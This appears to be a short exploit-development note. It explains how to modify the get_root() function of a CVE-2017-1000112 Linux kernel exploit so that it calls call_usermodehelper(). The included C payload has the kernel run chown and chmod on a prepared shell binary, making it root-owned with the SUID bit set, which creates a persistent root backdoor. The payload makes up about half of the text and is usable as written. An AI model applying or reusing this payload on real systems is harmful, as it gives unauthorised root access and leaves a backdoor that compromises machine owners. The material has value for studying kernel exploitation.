call_usermodehelper
===================

The idea of using `call_usermodehelper()` function (UMH) is the following:
1) Create a shell binary
2) Exploit the vulnerability and use UMH to change shell's file properties so it will be owned by root:root with SUID bit set

Here is the modified `get_root()` function of the original CVE-2017-1000112 exploit:

~~~
void get_root(void) {
	void (*call_usermodehelper)(const char *, void *, void *, int) = (void *)X_call_usermodehelper;
	char *chown[] = { (char []){ "/bin/chown" }, (char []){ "0:0" }, (char []){ SHELL }, NULL };
	call_usermodehelper(chown[0], chown, NULL, 1);
	char *chmod[] = { (char []){ "/bin/chmod" }, (char []){ "+sx" }, (char []){ SHELL }, NULL };
	call_usermodehelper(chmod[0], chmod, NULL, 1);
}
~~~
